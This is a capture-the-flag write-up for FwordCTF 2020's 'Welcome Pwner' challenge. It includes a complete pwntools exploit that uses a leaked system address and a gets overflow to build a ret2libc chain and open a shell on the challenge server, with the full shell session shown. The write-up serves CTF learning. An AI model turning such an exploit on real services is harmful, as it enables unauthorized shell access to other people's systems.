# FwordCTF 2020

## Welcome Pwner

> 374  
>  
> something to warm you up.  
>  
> `nc 54.210.217.206 1240`  
>  
> Author : haflout  
>  
> [`Molotov`](molotov)

Tags: _pwn_ _x86_ _remote-shell_ _bof_ _rop_

## Summary

Beginner BOF with `system` leaked, however user must find libc version
themselves.

## Analysis

### Checksec

```  
   Arch:     i386-32-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

Most mitigations in place, however no stack canary; BOF -> ROP.

  
### Decompile with Ghidra

```c  
undefined4 vuln(void)  
{  
 char local_20 [24];  
  
 printf("%x\n",system);  
 puts("Input : ");  
 gets(local_20);  
 return 0;  
}  
```

Not a lot here; `system` address leaked with `gets` vulnerability.  `local_20`
is `0x20` bytes from the return address on the stack.  Basic BOF.

Without knowing the version of libc we cannot pass the location of `/bin/sh`
to `system`;  identifying that however is simple with [libc-
database](https://github.com/niklasb/libc-database):

```  
# nc 54.210.217.206 1240  
f7de68b0  
Input :  
```

Take the last 3 nibbles and pass to `./find`:

```  
# ./find system 8b0 | grep _i386  
archive-glibc (id libc6_2.30-0ubuntu2.1_i386)  
ubuntu-eoan-i386-libc6 (id libc6_2.30-0ubuntu2.2_i386)  
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.30-0ubuntu2_i386.deb
(id libc6_2.30-0ubuntu2_i386)  
```

Multiple hits.  I went with `libc6_2.30-0ubuntu2_i386` and it worked out just
fine.  If it had failed, then there was only two other options to try.

## Exploit

This code assumes that `libc-database` is located in the same directory (I
just sym linked it) as `exploit.py`.

From within the `libc-database` type:

```  
# ./download libc6_2.30-0ubuntu2_i386  
```

This will download libc, ld, et al.

### Setup

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./molotov')  
context.log_level = 'INFO'  
context.log_file = 'log.log'

'''  
# local libc  
libc = binary.libc  
p = process(binary.path)  
'''  
# task libc  
libid = 'libc6_2.30-0ubuntu2_i386'  
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'  
ld = ELF(libpath + 'ld-2.30.so')  
libc = ELF(libpath + 'libc-2.30.so')  
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})  
p = remote('54.210.217.206', 1240)  
#'''  
```

The first few lines should not require much of an explanation, except perhaps
the `binary = context.binary = ELF('./molotov')` statement.  The
`context.binary` there in the middle will set the context (arch, os, etc...)
so that `rop`, `asm`, `constants`, etc... statements produce the correct
results.

The next section (selected by placing `#` at the first or last `'''`)
determines if you want to use your local libc or the challenge libc.  For most
easy challenges I dev/test with the local libc and then just test with the
task libc.  However for some, especially when pulling addresses from the
stack, I've found inconsistencies between my local libc is vs. the task libc.
Often time is wasted having to refactor or completely resolve for the task
libc.  The second block handles launching a challenge binary with the intended
libs.  And `gdb` works just fine with this as well.

### BOF, ROP, Shell

```python  
_ = p.recvline()  
system = int(_,16)  
log.info('system: ' + hex(system))  
libc.address = system - libc.sym.system  
log.info('baselibc: ' + hex(libc.address))

payload  = 0x20 * b'A'  
payload += p32(libc.sym.system)  
payload += 4 * b'B'  
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendlineafter('Input : \n',payload)  
p.interactive()  
```

With the correct libc in hand, just capture the system address, compute the
base of libc, then setup your ROP chain after padding with `0x20` bytes.

Output:

```bash  
# ./exploit.py  
[*] '/pwd/datajerk/fwordctf2020/welcome_pwner/molotov'  
   Arch:     i386-32-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] '/pwd/datajerk/fwordctf2020/welcome_pwner/libc-
database/libs/libc6_2.30-0ubuntu2_i386/ld-2.30.so'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[*] '/pwd/datajerk/fwordctf2020/welcome_pwner/libc-
database/libs/libc6_2.30-0ubuntu2_i386/libc-2.30.so'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to 54.210.217.206 on port 1240: Done  
[*] system: 0xf7dac8b0  
[*] baselibc: 0xf7d67000  
[*] Switching to interactive mode  
$ id  
uid=1000(fword) gid=1000(fword) groups=1000(fword)  
$ ls -l  
total 32  
-rw-r--r-- 1 root root    24 Aug 29 14:25 flag.txt  
-rwxr-xr-x 1 root root  7492 Aug 29 14:25 molotov  
-rwxr-xr-x 1 root root 18744 Aug 29 14:25 ynetd  
$ cat flag.txt  
FwordCTF{good_j0b_pwn3r}  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/fwordctf2020/welcome_pwner).